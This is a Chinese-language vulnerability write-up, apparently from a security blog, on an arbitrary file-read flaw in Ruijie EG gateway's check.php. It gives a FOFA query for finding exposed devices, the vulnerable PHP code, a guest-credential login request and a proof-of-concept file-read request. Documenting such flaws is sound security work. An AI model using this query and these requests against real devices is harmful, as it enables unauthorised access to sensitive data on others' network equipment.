---
title: "锐捷-EWEB check.php 文件读取漏洞"
source: https://mrxn.net/jswz/ruijieweb-check-fileread.html
asset_dir: assets/锐捷-eweb-check.php-文件读取漏洞
---

# 锐捷-EWEB check.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/27 08:25
- 1144浏览
- [0评论](#comment)
- 15分钟阅读

深入探索

sql

SQL

授权

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `check.php` 的 `indexAction` 存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)读取设备上任意文件内容，造成敏感信息泄露。

漏洞扫描服务

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

看下 `check.php` 关键业务 `indexAction` 逻辑的实现

深入探索

安全研究工具

物流软件安全

安全运维咨询

```
public function indexAction() {
        $root = "/tmp/html/";
        $name = $_GET["url"];
        $url = $root.$name;
        if($name == FALSE){
            header("Location: /index.htm");
            exit();
        }
        if (file_exists($url)) {
            $fileContent = file_get_contents($url);
            echo $fileContent;
        } else if (file_exists($url.".gz")) {
            header("Content-Encoding: gzip");
            $fileContent = file_get_contents($url.".gz");
            echo $fileContent;
        } else {
            echo "404 Resource Not Found";
        }
    }
```

深入探索

文件大小转换

漏洞修复方案

网络安全培训

用户输入的 `$_GET["url"]` 参数被直接赋值给 `$name` 变量，然后拼接成 `$url = $root . $name`，其中 $root 为固定值 "/tmp/html/"。未对 `$name` 进行任何过滤或验证，因此攻击者可以通过在 `$name` 中注入目录遍历序列（如 "../"）来访问系统中的任意文件，绕过预设的根目录限制，因此造成任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。

# 漏洞复现

## 获取cookie

```
POST /ddi/server/login.php HTTP/1.1
Host: ruijieweb.mrxn.ent
Content-Type: application/x-www-form-urlencoded

username=guest&password=guest?
```

[![锐捷-EWEB check.php 文件读取漏洞](images/img-001-489e6f4b63e4.webp)](https://image.mrxn.net/e2433a412d6049e3b49ff42339f02422.webp)

## 读取文件

```
GET /check.php?url=check.php HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip
```

[![锐捷-EWEB check.php 文件读取漏洞](images/img-002-d4af1f55b7b1.webp)](https://image.mrxn.net/2992ce1ab7374f7dae6d2d3c5103fa38.webp)

成功读取到 `check.php` 内容

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.获取cookie](#toc-5-1-)
- [5.2.读取文件](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

代码安全审计
